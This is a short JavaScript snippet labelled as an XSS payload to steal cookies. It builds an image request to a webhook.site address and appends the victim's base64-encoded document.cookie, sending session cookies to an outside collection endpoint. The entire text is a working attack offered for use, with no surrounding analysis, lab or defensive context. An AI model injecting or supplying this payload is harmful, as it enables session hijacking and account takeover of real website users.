// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/143c9f85-35ed-41b1-b388-b5d1293d5758?data=' + btoa(document.cookie);
